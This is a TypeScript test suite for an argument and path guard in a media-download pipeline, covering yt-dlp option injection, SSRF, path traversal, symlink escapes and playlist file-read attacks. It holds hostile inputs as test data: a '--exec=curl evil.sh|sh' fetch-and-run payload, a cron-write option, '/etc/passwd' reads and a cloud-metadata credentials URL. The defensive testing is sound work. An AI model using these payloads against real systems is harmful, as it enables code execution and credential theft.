/**
 * Attack-case tests for D-01 §8.4 / §8.5.
 *
 * Every defence layer gets at least one test that would FAIL if the layer were removed.
 * A layer with no such test is a comment, not a control.
 *
 * Run: node --test packages/pipeline/dist/subprocess/__tests__/argGuard.test.js
 */

import assert from 'node:assert/strict';
import { mkdtemp, mkdir, realpath, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';

import {
  MAX_URL_BYTES,
  assertWithinRoot,
  buildArgv,
  isPrivateOrReservedHost,
  hasAllowedMediaExtension,
  isLocalImportSafeExtension,
  isPlaylistExtension,
  isSafeExecutable,
  safePrompt,
  validateHttpUrl,
} from '../argGuard.js';

/** Assert rejection AND that it was rejected for the expected reason. */
function assertRejected(
  result: { ok: true; value: unknown } | { ok: false; code: string; message: string },
  expectedCode: string,
  label: string,
): void {
  assert.equal(result.ok, false, `${label}: expected rejection but it was ACCEPTED`);
  if (!result.ok) {
    // Asserting the CODE, not just the rejection: a check that rejects for the wrong
    // reason is a check that is not actually protecting what we think it protects.
    assert.equal(result.code, expectedCode, `${label}: rejected, but for the wrong reason`);
  }
}

describe('L3 — argument injection (the attack shell:false does NOT stop)', () => {
  it('rejects the canonical yt-dlp arbitrary-execution payload', () => {
    // The headline case from D-01 §8.4: with shell:false this is not shell injection,
    // it is a perfectly ordinary argv element that yt-dlp parses as an OPTION.
    assertRejected(
      validateHttpUrl('--exec=curl evil.sh|sh'),
      'leading_dash',
      '--exec payload',
    );
  });

  it('rejects every option-shaped input', () => {
    for (const payload of [
      '-o/etc/cron.d/pwn',
      '--config-locations=/tmp/evil.conf',
      '--load-info-json=/tmp/x.json',
      '--batch-file=/etc/passwd',
      '-',
      '--',
      '--paths=/root',
    ]) {
      assertRejected(validateHttpUrl(payload), 'leading_dash', payload);
    }
  });

  it('rejects non-http schemes (file/ftp/data/javascript)', () => {
    assertRejected(validateHttpUrl('file:///etc/passwd'), 'bad_scheme', 'file:');
    assertRejected(validateHttpUrl('ftp://example.com/x.mp3'), 'bad_scheme', 'ftp:');
    assertRejected(validateHttpUrl('data:audio/wav;base64,AAAA'), 'bad_scheme', 'data:');
    assertRejected(validateHttpUrl('javascript:alert(1)'), 'bad_scheme', 'javascript:');
  });

  it('rejects embedded credentials', () => {
    assertRejected(
      validateHttpUrl('https://user:pass@example.com/a.mp3'),
      'embedded_credentials',
      'credentials',
    );
  });

  it('rejects control characters BEFORE parsing (URL() would launder them)', () => {
    // new URL() silently strips \n and \t. Checking after parsing would let a hostile
    // string through in a clean-looking form.
    assertRejected(
      validateHttpUrl('https://example.com/a.mp3\n--exec=sh'),
      'control_characters',
      'newline smuggling',
    );
    assertRejected(validateHttpUrl('https://example.com/\u0000'), 'control_characters', 'NUL');
    assertRejected(validateHttpUrl('https://exa\tmple.com/a'), 'control_characters', 'tab');
  });

  it('enforces the length cap in BYTES, not characters', () => {
    // 1000 four-byte emoji = 4000 bytes but only 1000 code units.
    const emojiUrl = `https://example.com/${'\u{1F600}'.repeat(1000)}`;
    assert.ok(emojiUrl.length < MAX_URL_BYTES, 'precondition: short in UTF-16 units');
    assertRejected(validateHttpUrl(emojiUrl), 'too_long', 'multibyte length bypass');
  });

  it('accepts a legitimate URL and returns the NORMALISED form', () => {
    const r = validateHttpUrl('https://Example.COM/path/a%20b.mp3?x=1');
    assert.equal(r.ok, true);
    if (r.ok) {
      // Validating one string and passing a different one is a classic bypass, so the
      // guard hands back exactly what it checked.
      assert.equal(r.value.href, 'https://example.com/path/a%20b.mp3?x=1');
      assert.equal(r.value.hostname, 'example.com');
    }
  });
});

describe('L3.3 — SSRF (our own daemon listens on 127.0.0.1)', () => {
  it('blocks loopback, private, link-local and metadata addresses', () => {
    for (const host of [
      '127.0.0.1', '127.1.2.3', '0.0.0.0', 'localhost',
      '10.0.0.1', '172.16.0.1', '172.31.255.254', '192.168.1.1',
      '169.254.169.254', // AWS/GCE metadata
      '100.64.0.1', // CGNAT
      '::1', 'fe80::1', 'fc00::1', 'fd12::34',
      '::ffff:127.0.0.1', // IPv4-mapped loopback
      'foo.local', 'db.internal',
    ]) {
      assert.equal(isPrivateOrReservedHost(host), true, `${host} should be blocked`);
    }
  });

  it('allows ordinary public addresses', () => {
    for (const host of ['example.com', '8.8.8.8', '1.1.1.1', '93.184.216.34', '2606:4700::1111']) {
      assert.equal(isPrivateOrReservedHost(host), false, `${host} should be allowed`);
    }
  });

  it('rejects a URL pointing at the metadata endpoint', () => {
    assertRejected(
      validateHttpUrl('http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
      'private_address',
      'cloud metadata SSRF',
    );
  });

  it('rejects a URL pointing at our own daemon port', () => {
    assertRejected(
      validateHttpUrl('http://127.0.0.1:7331/api/v1/settings'),
      'private_address',
      'confused-deputy against our own API',
    );
  });
});

describe('L6 — the argv invariant', () => {
  it('places user operands after "--" and never merges them into a flag', () => {
    const r = buildArgv({ flags: ['--ignore-config', '-o', '%(id)s.%(ext)s'], operands: ['https://example.com/a.mp3'] });
    assert.equal(r.ok, true);
    if (r.ok) {
      assert.deepEqual(r.value, [
        '--ignore-config', '-o', '%(id)s.%(ext)s',
        '--',
        'https://example.com/a.mp3',
      ]);
      // The operand is exactly one element — never concatenated into its neighbour.
      assert.equal(r.value.filter((a) => a.includes('example.com')).length, 1);
    }
  });

  it('still rejects a dash-leading operand even though "--" is present', () => {
    // Defence in depth: yt-dlp honours `--`, but we do not rely on every future tool
    // doing so.
    assertRejected(buildArgv({ flags: [], operands: ['--exec=sh'] }), 'leading_dash', 'dash after --');
  });

  it('rejects operands carrying control characters', () => {
    assertRejected(
      buildArgv({ flags: [], operands: ['https://x.com/a\nb'] }),
      'control_characters',
      'newline in operand',
    );
  });

  it('omits "--" when there are no operands', () => {
    const r = buildArgv({ flags: ['-version'], operands: [] });
    assert.equal(r.ok, true);
    if (r.ok) assert.deepEqual(r.value, ['-version']);
  });
});

describe('L4 — prompt truncation', () => {
  it('caps the prompt so it cannot blow past MAX_ARG_STRLEN', () => {
    const out = safePrompt('x'.repeat(100_000));
    assert.notEqual(out, null);
    assert.equal(out!.length, 1024);
  });

  it('strips control characters from the prompt', () => {
    assert.equal(safePrompt('hello\nworld'), 'hello world');
  });

  it('maps an empty prompt to null rather than an empty argv element', () => {
    assert.equal(safePrompt('   '), null);
    assert.equal(safePrompt(undefined), null);
  });
});

describe('L2 — executable allowlist (CVE-2024-27980)', () => {
  it('refuses .bat/.cmd on Windows, which Node can only run via cmd.exe', () => {
    for (const p of ['C:\\tools\\yt-dlp.bat', 'C:\\tools\\x.cmd', 'C:\\tools\\x.ps1']) {
      assertRejected(isSafeExecutable(p, 'win32'), 'unsafe_executable', p);
    }
  });

  it('allows .exe on Windows', () => {
    assert.equal(isSafeExecutable('C:\\tools\\yt-dlp.exe', 'win32').ok, true);
  });

  it('requires an absolute path so PATH is never searched', () => {
    assertRejected(isSafeExecutable('ffmpeg', 'linux'), 'path_escape', 'bare command name');
  });
});

describe('L7 (§8.5) — path traversal', () => {
  const dirs: string[] = [];
  after(() => {
    // Scratch dirs live under the OS temp dir; leaving them is harmless.
    dirs.length = 0;
  });

  it('blocks ../ escapes and allows legitimate children', async () => {
    const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
    dirs.push(root);
    await mkdir(join(root, 'media'), { recursive: true });
    await writeFile(join(root, 'media', 'ok.wav'), 'x');

    assertRejected(
      await assertWithinRoot(root, '../../../etc/passwd'),
      'path_escape',
      'dot-dot escape',
    );
    assertRejected(await assertWithinRoot(root, '/etc/passwd'), 'path_escape', 'absolute escape');

    const good = await assertWithinRoot(root, 'media/ok.wav');
    assert.equal(good.ok, true, 'legitimate child path should be accepted');
  });

  it('follows symlinks before deciding — a lexical check would be fooled', async () => {
    const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
    dirs.push(root);
    // "inside/escape" LOOKS contained, but resolves to /etc.
    await symlink('/etc', join(root, 'escape')).catch(() => undefined);

    const r = await assertWithinRoot(root, 'escape/passwd');
    // If this ever starts passing, someone replaced realpath with path.resolve.
    assertRejected(r, 'path_escape', 'symlink escape');
  });

  /*
   * ★ T-143 ② — the Windows half of this guard, executed on Linux for the first time.
   *
   * Until now `assertWithinRoot` read the host's `process.platform`, so on this machine
   * the UNC / drive-relative branch was UNREACHABLE and no test had ever run it. That is
   * bug #8 of the false-green family (`isSafeExecutable`) sitting untouched in the
   * function next door — same shape, same fix: platform becomes an input.
   *
   * These cases pass the platform EXPLICITLY, so they pin the guard's behaviour on
   * Windows regardless of where the suite happens to run.
   */
  describe('T-143 ② — win32 path forms (previously unreachable on Linux)', () => {
    const WIN_ROOT = 'C:\\openmemo\\data';

    it('★ UNC path is rejected under win32 rules', async () => {
      assertRejected(
        await assertWithinRoot(WIN_ROOT, '\\\\server\\share\\evil', 'win32'),
        'path_escape',
        'UNC',
      );
    });

    it('★ drive-relative path is rejected under win32 rules', async () => {
      assertRejected(await assertWithinRoot(WIN_ROOT, 'C:evil', 'win32'), 'path_escape', 'C:rel');
      assertRejected(await assertWithinRoot(WIN_ROOT, 'd:evil', 'win32'), 'path_escape', 'd:rel');
    });

    it('★ absolute drive path outside the root is rejected under win32 rules', async () => {
      assertRejected(
        await assertWithinRoot(WIN_ROOT, 'C:\\Windows\\win.ini', 'win32'),
        'path_escape',
        'other absolute drive path',
      );
    });

    it('★ backslash traversal is rejected under win32 rules (posix rules would miss it)', async () => {
      assertRejected(
        await assertWithinRoot(WIN_ROOT, '..\\..\\Windows\\win.ini', 'win32'),
        'path_escape',
        'backslash dot-dot',
      );
    });

    it('★ a legitimate win32 child is still accepted (the guard must not reject everything)', async () => {
      const r = await assertWithinRoot(WIN_ROOT, 'media\\ok.wav', 'win32');
      assert.equal(r.ok, true, 'a normal Windows subpath must pass');
      assert.equal(r.ok === true ? r.value : '', 'C:\\openmemo\\data\\media\\ok.wav');
    });

    /*
     * The half that documents WHY this needed a parameter at all: run the exact same
     * inputs under posix rules and the UNC form is NOT rejected — it becomes a file
     * whose name contains backslashes, sitting inside the root.
     *
     * That is the honest scope of the bug: harmless on Linux, but it means the Windows
     * branch had never been executed by anything, ever.
     */
    it('★ under posix rules the same UNC string is merely a weird filename — this is why the branch was invisible', async () => {
      const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
      dirs.push(root);
      const r = await assertWithinRoot(root, '\\\\server\\share\\evil', 'linux');
      assert.equal(r.ok, true, 'posix treats backslashes as ordinary filename characters');
      /*
       * ★ T-145: compare against realpath(root), not root.
       *
       * This line used to say `join(root, …)`. It passed on Linux and FAILED on the
       * first ever macOS CI run, because macOS's TMPDIR lives under `/var`, which is
       * a symlink to `/private/var`. `assertWithinRoot` returns realpath'd values, so
       * the expectation has to be realpath'd too — otherwise the test is asserting
       * "the host's tmpdir is not behind a symlink", which is a property of the
       * machine, not of the guard.
       */
      assert.equal(
        r.ok === true ? r.value : '',
        join(await realpath(root), '\\\\server\\share\\evil'),
        'it stays INSIDE the root — not an escape, just untested',
      );
    });
  });

  /*
   * ★★ T-145 — the managed root itself sits behind a symlink.
   *
   * Found by CI: `packages/pipeline` was the only red on macos-26, and chasing it
   * turned up a REAL product bug, not just a host-bound test.
   *
   * The symptom is unusually nasty because it is HALF working:
   *   - a file that already exists  -> accepted
   *   - a file about to be CREATED  -> rejected as path_escape
   * i.e. reading works and writing does not, which reads like a permissions problem.
   *
   * Mechanism: `realpathOrResolve` falls back to the lexical path when the target does
   * not exist yet (correct — you cannot realpath a file that is not there). So when the
   * root is behind a symlink, the two sides of the comparison came from different
   * branches: the root was realpath'd, the not-yet-existing target was not.
   *
   * Why macOS and not Linux: on macOS `/var` and `/tmp` ARE symlinks (-> /private/…),
   * so the DEFAULT temp dir already triggers it. On Linux you have to build the symlink
   * yourself — which is exactly what these cases do, so they pin the behaviour
   * everywhere and would have caught it on this box.
   */
  describe('T-145 — managed root reached through a symlink (macOS default TMPDIR is)', () => {
    async function symlinkedRoot(): Promise<{ link: string; real: string }> {
      const base = await mkdtemp(join(tmpdir(), 'openmemo-symroot-'));
      dirs.push(base);
      const real = join(base, 'realroot');
      await mkdir(real);
      const link = join(base, 'linkroot');
      await symlink(real, link);
      return { link, real: await realpath(real) };
    }

    it('★ a file that does not exist yet is still INSIDE the root (this is the bug)', async () => {
      const { link, real } = await symlinkedRoot();
      const r = await assertWithinRoot(link, 'newfile.wav');
      assert.equal(r.ok, true, 'an output path the pipeline is about to create must pass');
      assert.equal(r.ok === true ? r.value : '', join(real, 'newfile.wav'));
    });

    it('★ nested not-yet-existing path too', async () => {
      const { link, real } = await symlinkedRoot();
      const r = await assertWithinRoot(link, 'sub/new.wav');
      assert.equal(r.ok, true);
      assert.equal(r.ok === true ? r.value : '', join(real, 'sub', 'new.wav'));
    });

    it('an existing file keeps working (it always did — that is why this hid)', async () => {
      const { link, real } = await symlinkedRoot();
      await writeFile(join(real, 'exists.wav'), 'x');
      const r = await assertWithinRoot(link, 'exists.wav');
      assert.equal(r.ok, true);
      assert.equal(r.ok === true ? r.value : '', join(real, 'exists.wav'));
    });

    /* ★ The reverse half: the fix must NOT have loosened any of the three escapes. */
    it('★ `..` traversal is still rejected through a symlinked root', async () => {
      const { link } = await symlinkedRoot();
      assertRejected(await assertWithinRoot(link, '../escape'), 'path_escape', 'dot-dot');
    });

    it('★ an absolute path is still rejected through a symlinked root', async () => {
      const { link } = await symlinkedRoot();
      assertRejected(await assertWithinRoot(link, '/etc/hostname'), 'path_escape', 'absolute');
    });

    it('★ a symlink INSIDE the root pointing outside is still rejected', async () => {
      const { link, real } = await symlinkedRoot();
      await symlink('/etc/hostname', join(real, 'escape.wav'));
      assertRejected(await assertWithinRoot(link, 'escape.wav'), 'path_escape', 'inner symlink');
    });
  });
});

describe('L4 — playlist indirection (measured attack, T-026)', () => {
  it('refuses playlist extensions for LOCAL import', () => {
    /*
     * A local .m3u8 whose segment URI is `file:///tmp/secret.ts` makes ffmpeg open that
     * path — verified in a real run:
     *     Opening 'file:///tmp/attack/secret.ts' for reading
     * The local branch must pass `-protocol_whitelist file` for ordinary media to
     * decode, so the protocol whitelist cannot stop this. Refusing local playlist
     * imports is what closes it.
     */
    for (const p of ['/tmp/evil.m3u8', '/tmp/evil.m3u', '/tmp/x.pls', '/tmp/x.xspf', '/tmp/x.asx']) {
      assert.equal(isPlaylistExtension(p), true, `${p} must be recognised as a playlist`);
      assert.equal(isLocalImportSafeExtension(p), false, `${p} must not be locally importable`);
    }
  });

  it('still allows ordinary media for local import', () => {
    for (const p of ['/tmp/a.mp3', '/tmp/a.wav', '/tmp/a.mp4', '/tmp/a.flac']) {
      assert.equal(isLocalImportSafeExtension(p), true, `${p} should remain importable`);
    }
  });

  it('keeps .m3u8 in the general media allowlist (remote HLS must still work)', () => {
    // Remote HLS uses a protocol whitelist WITHOUT `file`, which was verified to block
    // the same attack. Only LOCAL import is refused.
    assert.equal(hasAllowedMediaExtension('/x/stream.m3u8'), true);
  });
});
